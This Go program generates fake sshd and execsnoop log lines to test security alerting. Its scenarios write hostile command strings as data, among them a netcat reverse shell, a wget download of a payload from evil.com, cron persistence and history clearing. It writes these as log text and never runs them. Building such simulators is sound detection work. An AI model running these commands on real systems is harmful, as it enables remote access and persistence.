package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"os"
	"time"
)

const (
	logFile             = "testdata/auth.log"
	sshdTimeFormat      = "Jan _2 15:04:05"
	execsnoopTimeFormat = time.RFC3339
)

var (
	failedLoginTemplate   = "%s my-server sshd[%d]: Failed password for %s from %s port %d ssh2\n"
	acceptedLoginTemplate = "%s my-server sshd[%d]: Accepted password for %s from %s port %d ssh2\n"
	execsnoopTemplate     = "%s %d %s %d %d %d %s\n"
)

type Scenario struct {
	Name        string
	Command     string
	FullCommand string
	UID         int
}

var suspiciousScenarios = []Scenario{
	{Name: "Network Scan", Command: "nmap", FullCommand: "nmap -p 1-65535 10.0.0.1", UID: 1000},
	{Name: "Reverse Shell", Command: "nc", FullCommand: "nc -e /bin/bash 10.0.0.2", UID: 1000},
	{Name: "User Creation", Command: "useradd", FullCommand: "useradd attacker", UID: 0},
	{Name: "Privilege Escalation", Command: "sudo", FullCommand: "sudo su -", UID: 1000},
	{Name: "Persistence via Cron", Command: "crontab", FullCommand: "crontab -l | { cat; echo \"* * * * * /bin/bash -i\"; } | crontab -", UID: 1000},
}

func main() {
	log.Println("Starting log simulator....")

	scenario := flag.String("scenario", "", "Run a specific, targeted test case: 'download', 'bruteforce', 'newuser', or 'rapid'")
	continuous := flag.Bool("continuous", false, "Run a continuous simulation of random, single log events.")

	flag.Parse()

	if *scenario != "" {
		runScenario(*scenario)
	} else if *continuous {
		runContinousSimulation()
	} else {
		log.Println("No mode specified. Use '--scenario=<name>' for a targeted test or '--continuous for a random simulation.")
	}
}

func runScenario(name string) {
	log.Printf("Starting targeted log simulation for '%s'...", name)

	f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("failed to open og file: %v", err)
	}
	defer f.Close()

	switch name {
	case "bruteforce":
		log.Println("Starting targeted log simulation for 'Brute-Force & Evasion'...")
		attackIP := "198.51.100.99"

		log.Println("Injecting: SSH Brute-Force")
		for i := 0; i < 6; i++ {
			timestamp := time.Now().Format("Jan  2 15:04:05")
			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
			failedLog := fmt.Sprintf(failedLoginTemplate, timestamp, pid, "root", attackIP, port)
			f.WriteString(failedLog)
			time.Sleep(200 * time.Millisecond) // Short delay between attempts
		}
		log.Println("--> A 'TooManyFailedLogins' alert should have fired.")
		time.Sleep(3 * time.Second)

		log.Println("Injecting: Successful Login post-brute-force")
		timestampSuccess := time.Now().Format("Jan  2 15:04:05")
		sshdPID, portSuccess := rand.Intn(9000)+1000, rand.Intn(60000)+1024
		successLog := fmt.Sprintf(acceptedLoginTemplate, timestampSuccess, sshdPID, "root", attackIP, portSuccess)
		f.WriteString(successLog)

		time.Sleep(5 * time.Second)

		// 5. Attacker tries to cover their tracks
		log.Println("Injecting: Defense Evasion (history clear)")
		timestampEvasion := time.Now().UTC().Format(execsnoopTemplate)
		pidEvasion := rand.Intn(9000) + 1000
		ppidEvasion := sshdPID

		evasionLog := fmt.Sprintf(execsnoopTemplate, timestampEvasion, 0, "bash", pidEvasion, ppidEvasion, 0, "history -c")
		f.WriteString(evasionLog)

		log.Println("--> A 'CorrelatedBruteForceAndEvasion' alert should have fired.")
	case "download":
		log.Println("Starting targeted log simulation for 'Download & Execute'...")

		// --- The Attack Chain ---

		// 1. Attacker downloads a payload to /tmp
		log.Println("Injecting: File Download (wget)")
		timestamp1 := time.Now().UTC().Format(execsnoopTimeFormat)
		pid1, ppid1 := rand.Intn(9000)+1000, rand.Intn(9000)+1000
		downloadLog := fmt.Sprintf(execsnoopTemplate, timestamp1, 1000, "wget", pid1, ppid1, 0, "wget -O /tmp/payload.sh http://evil.com/payload.sh")
		f.WriteString(downloadLog)

		// 2. Wait for 5 seconds
		time.Sleep(5 * time.Second)

		// 3. Attacker executes the payload
		log.Println("Injecting: Payload Execution (bash)")
		timestamp2 := time.Now().Format("15:04:05")
		pid2, ppid2 := rand.Intn(9000)+1000, rand.Intn(9000)+1000
		executeLog := fmt.Sprintf(execsnoopTemplate, timestamp2, 1000, "bash", pid2, ppid2, 0, "bash /tmp/payload.sh")
		f.WriteString(executeLog)

		log.Println("Simulation finished.")
	case "newuser":
		// --- Test Case for New Account & Immediate Use ---
		log.Println("Starting targeted log simulation for 'New Account & Immediate Use'...")
		newUser := "attacker-acct"
		loginIP := "203.0.113.55"
		log.Printf("Injecting: New user creation (%s)", newUser)

		// --- The Attack Chain ---

		// 1. Attacker creates a new user for persistence.
		timestampCreate := time.Now().UTC().Format(execsnoopTimeFormat)
		pidCreate, ppidCreate := rand.Intn(9000)+1000, rand.Intn(9000)+1000
		createLog := fmt.Sprintf(execsnoopTemplate, timestampCreate, 0, "useradd", pidCreate, ppidCreate, 0, "useradd "+newUser)
		f.WriteString(createLog)

		// 2. Wait for 5 seconds
		time.Sleep(5 * time.Second)

		// 3. Attacker immediately uses the new account to log in.
		log.Printf("Injecting: Successful login for new user %s", newUser)
		timestampLogin := time.Now().Format(sshdTimeFormat)
		pidLogin, portLogin := rand.Intn(9000)+1000, rand.Intn(60000)+1024
		loginLog := fmt.Sprintf(acceptedLoginTemplate, timestampLogin, pidLogin, newUser, loginIP, portLogin)
		f.WriteString(loginLog)
	case "rapid":
		log.Println("Injecting: Rapid Process Execution Burst (15 processes).....")
		timestamp := time.Now().UTC().Format(execsnoopTimeFormat)
		pid, ppid := rand.Intn(90000)+1000, rand.Intn(90000)+1000
		for i := 0; i < 15; i++ {
			logLine := fmt.Sprintf(execsnoopTemplate, timestamp, 1000, "ls", pid, ppid, 0, "/bin/ls")
			f.WriteString(logLine)
			time.Sleep(100 * time.Millisecond)
		}
		log.Println("--> A single 'RapidProcessExecution' alert should have fired.")
	default:
		log.Fatalf("Unknown scenario: %s. Available scenarios: bruteforce, download, newuser, rapid", name)
	}

	log.Println("Scenario finished.")
}

func runContinousSimulation() {
	log.Println("Starting random 'chaos' attack log simulation... (Press Ctrl+C to stop)")

	for {

		f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Printf("Error opening log file: %v", err)
			continue
		}

		var logLine string
		event_type := rand.Intn(3)

		switch event_type {
		case 0:
			// Scenario: single suspicious command
			scenario := suspiciousScenarios[rand.Intn(len(suspiciousScenarios))]
			log.Printf("Injecting: Suspicious command (%s)", scenario.Name)
			timestamp := time.Now().Format("15:04:05")
			pid, ppid := rand.Intn(9000)+1000, rand.Intn(90000)+1000
			logLine = fmt.Sprintf(execsnoopTemplate, timestamp, scenario.UID, scenario.Command, pid, ppid, 0, scenario.FullCommand)
		case 1:
			log.Printf("Injecting: Successful Login for jsmith")
			timestamp := time.Now().Format("Jan  2 15:04:05")
			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
			logLine = fmt.Sprintf(acceptedLoginTemplate, timestamp, pid, "jsmith", "193.99.144.80", port)
		case 2:
			// Single random failed Login
			ip := fmt.Sprintf("10.10.10.%d", rand.Intn(254)+1)
			log.Printf("Injecting: Random failed login from %s", ip)
			timestamp := time.Now().Format(sshdTimeFormat)
			pid, port := rand.Intn(9000)+1000, rand.Intn(60000)+1024
			logLine = fmt.Sprintf(failedLoginTemplate, timestamp, pid, "admin", ip, port)
		}

		if _, err := f.WriteString(logLine); err != nil {
			log.Printf("failed to write to log file: %v", err)
		}

		f.Close()

		time.Sleep(time.Duration(rand.Intn(4)+1) * time.Second)
	}
}
